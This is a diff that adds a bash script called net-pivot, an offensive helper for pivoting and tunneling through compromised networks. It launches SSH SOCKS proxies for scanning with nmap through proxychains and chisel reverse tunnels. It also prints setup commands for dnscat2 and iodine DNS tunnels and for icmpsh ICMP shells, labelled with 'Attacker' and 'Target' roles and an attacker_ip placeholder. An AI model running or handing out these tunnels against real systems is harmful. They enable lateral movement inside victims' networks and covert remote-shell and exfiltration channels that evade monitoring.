@@ -1,0 +1,71 @@
+#!/bin/bash
+# /usr/local/bin/net-pivot
+# Pivoting and tunneling tools
+# Usage: net-pivot <mode>
+# Modes: socks, chisel, dns, icmp
+
+MODE="$1"
+
+if [ -z "$MODE" ]; then
+    echo "Usage: net-pivot <mode>"
+    echo ""
+    echo "Modes:"
+    echo "  socks   — SOCKS5 proxy via SSH dynamic port forwarding"
+    echo "  chisel  — TCP tunnel via chisel (client/server)"
+    echo "  dns     — DNS tunnel via dnscat2/iodine"
+    echo "  icmp    — ICMP tunnel via icmpsh"
+    echo ""
+    echo "Examples:"
+    echo "  net-pivot socks <pivot_host> <user> [local_port]"
+    echo "  net-pivot chisel client <server:port> <local:remote>"
+    echo "  net-pivot chisel server -p <port> --reverse"
+    exit 1
+fi
+
+case "$MODE" in
+    socks)
+        HOST="$2"
+        USER="${3:-root}"
+        PORT="${4:-1080}"
+        if [ -z "$HOST" ]; then
+            echo "[!] Usage: net-pivot socks <pivot_host> [user] [local_port]"
+            exit 1
+        fi
+        echo "[*] Starting SOCKS5 proxy..."
+        echo "[*] SSH dynamic forward: $USER@$HOST on local port $PORT"
+        echo "[*] Configure proxychains: socks5 127.0.0.1 $PORT"
+        echo ""
+        ssh -D "$PORT" -N -f "$USER@$HOST"
+        echo "[+] SOCKS5 proxy running on 127.0.0.1:$PORT"
+        echo "[+] Use with: proxychains nmap -sT -Pn <target>"
+        ;;
+    chisel)
+        ROLE="$2"
+        shift 2 2>/dev/null
+        if [ -z "$ROLE" ]; then
+            echo "[!] Usage: net-pivot chisel [client|server] [args...]"
+            exit 1
+        fi
+        echo "[*] Starting chisel $ROLE..."
+        chisel "$ROLE" "$@"
+        ;;
+    dns)
+        echo "[*] DNS tunneling requires a DNS server."
+        echo "[*] Server: dnscat2 --dns server=127.0.0.1,port=53"
+        echo "[*] Client: dnscat2 --dns server=<dns_ip>,port=53"
+        echo "[*] Or use iodine for simpler IP-over-DNS:"
+        echo "    Server: iodined -f -c -P <pass> 10.0.0.1 <domain>"
+        echo "    Client: iodine -f -P <pass> <dns_server> <domain>"
+        ;;
+    icmp)
+        echo "[*] ICMP tunnel — requires icmpsh on both ends"
+        echo "[*] Attacker (server): icmpsh -s <attacker_ip>"
+        echo "[*] Target (client):  icmpsh -c <attacker_ip>"
+        echo "[*] NOTE: Disable ICMP responses on attacker:"
+        echo "    sysctl -w net.ipv4.icmp_echo_ignore_all=1"
+        ;;
+    *)
+        echo "[!] Unknown mode: $MODE"
+        exit 1
+        ;;
+esac
